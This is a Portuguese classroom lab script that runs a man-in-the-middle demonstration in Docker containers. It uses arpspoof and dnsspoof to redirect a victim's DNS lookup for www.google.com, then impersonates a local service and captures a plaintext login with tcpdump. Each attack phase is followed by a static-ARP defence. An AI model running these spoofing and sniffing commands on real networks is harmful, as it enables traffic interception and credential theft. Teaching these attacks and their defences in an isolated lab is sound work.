#!/bin/bash
# ============================================================
# mitm.sh — Man-in-the-Middle via ARP Spoofing + DNS Spoofing (RSSI Aula 4)
# Este script faz só o papel do ATACANTE. Abra TAMBÉM o mitm_vitima.sh
# num segundo terminal — é lá que você mesmo digita o ping/curl ao vivo,
# quando este script pedir.
# Requisito: containers "vitima", "atacante" e "servico" ja de pe (setup.sh)
# Uso: ./mitm.sh — roteiro interativo, aperte ENTER pra avançar cada passo
# Verde = tudo relacionado ao ATACANTE | Amarelo = tudo relacionado à VÍTIMA
#
# Fase 1: ataque ao GATEWAY (10.10.10.1) -- intercepta a consulta DNS real
#         que a vitima manda pra internet, pro www.google.com DE VERDADE.
# Fase 2: ataque ao SERVICO (10.10.10.53) -- intercepta um "login" local.
# ============================================================
cd "$(dirname "$0")"

TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

VERDE=$'\033[0;32m'
AMARELO=$'\033[0;33m'
RESET=$'\033[0m'

pausa() {
  echo
  echo ">> A seguir: $1"
  read -rp "   [pressione ENTER para continuar] " _
  echo
}

# Pausa que espera você ir pro OUTRO terminal (mitm_vitima.sh) fazer algo lá.
pausa_vitima() {
  echo
  printf "%s>> VÁ PRO TERMINAL DA VÍTIMA (mitm_vitima.sh) e rode:%s\n" "$AMARELO" "$RESET"
  printf "%s   %s%s\n" "$AMARELO" "$1" "$RESET"
  read -rp "   [pressione ENTER aqui depois de rodar lá] " _
  echo
}

box_topo()  { printf "%s+------------------------------------------------------+%s\n" "$1" "$RESET"; }
box_linha() { printf "%s| %-54s |%s\n" "$1" "$2" "$RESET"; }

# Espera ate 8s a tabela ARP da vitima confirmar o MAC forjado -- evita
# seguir em frente antes do envenenamento realmente ter feito efeito.
esperar_veneno() {
  local alvo_ip="$1" mac_esperado="$2"
  for _ in $(seq 1 16); do
    local mac
    mac=$(docker exec vitima sh -c "arp -n | awk '\$1==\"$alvo_ip\"{print \$3}'")
    [ "$mac" = "$mac_esperado" ] && return 0
    sleep 0.5
  done
  echo "  (aviso: nao confirmei o envenenamento em 8s, seguindo mesmo assim)"
}
ATACANTE_MAC=$(docker exec atacante cat /sys/class/net/eth0/address)

echo "== Man-in-the-Middle: ARP Spoofing + DNS Spoofing (papel do ATACANTE) =="
echo "Abra o mitm_vitima.sh num segundo terminal — é lá que você digita os comandos"
echo "da vítima, ao vivo, quando este script pedir."
echo "(fase 1 ataca o gateway pra pegar o DNS real da vitima; fase 2 ataca o servico local)"

pausa "conferir o MAC real do gateway e do servico, antes de qualquer ataque."
# Mata qualquer arpspoof/dnsspoof orfao de uma execucao anterior, e limpa a
# tabela ARP da vitima -- garante que a leitura de MAC abaixo (e a defesa
# no final) nunca fique presa a um ataque antigo que ficou rodando.
docker exec atacante sh -c 'pkill -9 arpspoof; pkill -9 dnsspoof' 2>/dev/null
docker exec vitima arp -d 10.10.10.1 >/dev/null 2>&1
docker exec vitima arp -d 10.10.10.53 >/dev/null 2>&1
# Le o MAC direto na FONTE (bridge do host / interface do container) -- nunca
# via "arp -n" na vitima, porque uma entrada envenenada corromperia a leitura.
BRIDGE_ID=$(docker network inspect rssi-labnet --format '{{.Id}}' | cut -c1-12)
GATEWAY_MAC=$(cat "/sys/class/net/br-$BRIDGE_ID/address")
SERVICO_MAC=$(docker exec servico cat /sys/class/net/eth0/address)
echo "  gateway: $GATEWAY_MAC | servico: $SERVICO_MAC"

pausa_vitima 'ping -c 2 www.google.com   (repare no IP real que aparece)'

pausa "FASE 1 — disparar o ataque no gateway: ARP spoofing + DNS spoofing."
box_topo "$VERDE"
box_linha "$VERDE" "ATACANTE — FASE 1"
box_topo "$VERDE"
box_linha "$VERDE" "IP real:      10.10.10.10"
box_linha "$VERDE" "Se passa por: 10.10.10.1 (o gateway)"
box_linha "$VERDE" "Ataque:       ARP spoofing + DNS spoofing"
box_linha "$VERDE" "Resposta falsa: www.google.com -> 10.10.10.66"
box_topo "$VERDE"
echo
printf "%s>> atacante executando: arpspoof -i eth0 -t 10.10.10.20 10.10.10.1%s\n" "$VERDE" "$RESET"
printf "%s>> atacante executando: dnsspoof -i eth0 -f dnsspoof.hosts%s\n" "$VERDE" "$RESET"
docker exec atacante sh -c 'echo "10.10.10.66 www.google.com" > /tmp/dnsspoof.hosts'
# -i = interface | -t = alvo do ataque, seguido do IP que o atacante quer forjar (o gateway)
docker exec atacante timeout 300 arpspoof -i eth0 -t 10.10.10.20 10.10.10.1 >/dev/null 2>&1 &
ARP_PID=$!
# -f = arquivo com as respostas falsas (formato "IP dominio") que o dnsspoof deve responder
docker exec atacante timeout 300 dnsspoof -i eth0 -f /tmp/dnsspoof.hosts >/dev/null 2>&1 &
DNS_PID=$!
esperar_veneno 10.10.10.1 "$ATACANTE_MAC"
echo "  ataque ativo — pode ir pro outro terminal."

pausa_vitima 'ping -c 2 www.google.com   (repare que o IP mudou!)'

docker exec atacante sh -c 'pkill -9 arpspoof; pkill -9 dnsspoof' 2>/dev/null
wait 2>/dev/null

pausa "aplicar a defesa da fase 1: registrar entrada ARP estática pro gateway."
docker exec vitima arp -s 10.10.10.1 "$GATEWAY_MAC"
echo "  entrada estática registrada — o DNS da vitima volta a ser confiável mesmo sob ataque."

pausa "FASE 2 — disparar o ataque no servico: vamos capturar um 'login'."
box_topo "$VERDE"
box_linha "$VERDE" "ATACANTE — FASE 2"
box_topo "$VERDE"
box_linha "$VERDE" "IP real:      10.10.10.10"
box_linha "$VERDE" "Se passa por: 10.10.10.53 (o servico)"
box_linha "$VERDE" "Objetivo:     capturar a próxima requisição HTTP"
box_topo "$VERDE"
echo
printf "%s>> atacante executando: arpspoof -i eth0 -t 10.10.10.20 10.10.10.53%s\n" "$VERDE" "$RESET"
docker exec atacante timeout 300 arpspoof -i eth0 -t 10.10.10.20 10.10.10.53 >/dev/null 2>&1 &
ARP_PID=$!
esperar_veneno 10.10.10.53 "$ATACANTE_MAC"
# ip addr add = o atacante assume tambem o IP do servico temporariamente, so assim
# consegue completar o handshake TCP e receber a requisicao HTTP de verdade
docker exec atacante ip addr add 10.10.10.53/32 dev eth0
docker exec atacante sh -c "ss -ltn | grep -q ':80'" || docker exec -d atacante busybox httpd -f -p 80 -h /tmp
docker exec atacante sh -c 'rm -f /tmp/http.pcap'
docker exec -d atacante timeout 300 tcpdump -U -i eth0 -n -A -w /tmp/http.pcap tcp port 80
echo "  ataque ativo — pode ir pro outro terminal."

pausa_vitima 'curl "http://10.10.10.53/login?usuario=aluno&senha=SenhaSecreta123"'

docker exec atacante sh -c "tcpdump -r /tmp/http.pcap -A -n 2>/dev/null | grep -oE 'GET /login[^ ]*'" > "$TMPDIR/capturado"
CAPTURADO=$(head -n1 "$TMPDIR/capturado")
docker exec atacante ip addr del 10.10.10.53/32 dev eth0
docker exec atacante pkill -9 arpspoof 2>/dev/null
docker exec atacante pkill -9 -f 'tcpdump.*http.pcap' 2>/dev/null
wait 2>/dev/null
box_topo "$VERDE"
box_linha "$VERDE" "ATACANTE — capturado (em texto puro!)"
box_topo "$VERDE"
box_linha "$VERDE" "${CAPTURADO:-(nada capturado — tente de novo)}"
box_topo "$VERDE"

pausa "aplicar a defesa da fase 2: registrar entrada ARP estática pro servico."
docker exec vitima arp -s 10.10.10.53 "$SERVICO_MAC"
echo "  entrada estática registrada — a mesma defesa protege DNS e login."

pausa "atacar de novo com as duas defesas ativas — confirmar que o DNS real volta a funcionar."
docker exec atacante sh -c 'echo "10.10.10.66 www.google.com" > /tmp/dnsspoof.hosts'
docker exec atacante timeout 300 arpspoof -i eth0 -t 10.10.10.20 10.10.10.1 >/dev/null 2>&1 &
ARP_PID=$!
docker exec atacante timeout 300 dnsspoof -i eth0 -f /tmp/dnsspoof.hosts >/dev/null 2>&1 &
DNS_PID=$!
sleep 2
echo "  ataque ativo — pode ir pro outro terminal."

pausa_vitima 'ping -c 2 www.google.com   (deve voltar a mostrar o IP real, mesmo sob ataque)'

docker exec atacante sh -c 'pkill -9 arpspoof; pkill -9 dnsspoof' 2>/dev/null
wait 2>/dev/null

echo
echo "== Fim =="
echo "(pra limpar as entradas estáticas depois: docker exec vitima arp -d 10.10.10.1 10.10.10.53)"
